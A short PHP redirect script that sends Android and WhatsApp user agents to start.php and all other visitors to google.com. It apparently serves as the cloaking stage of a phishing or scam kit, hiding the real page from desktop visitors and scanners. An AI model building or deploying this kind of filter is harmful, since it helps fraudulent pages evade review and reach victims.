<?php
session_start();
  
    $ip = $_SERVER["REMOTE_ADDR"];
    $user = $_SERVER['HTTP_USER_AGENT'];
    $android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
    $wey = strpos($_SERVER['HTTP_USER_AGENT'],"YoGBWhatsApp");
    $weys = strpos($_SERVER['HTTP_USER_AGENT'],"WhatsApp");
    if ($android == true || $wey == true || $weys == true) 
    { 
         header('Location: start.php');
   
    } 
    else {
		header('Location: https://google.com');
    };
       
    
    ?>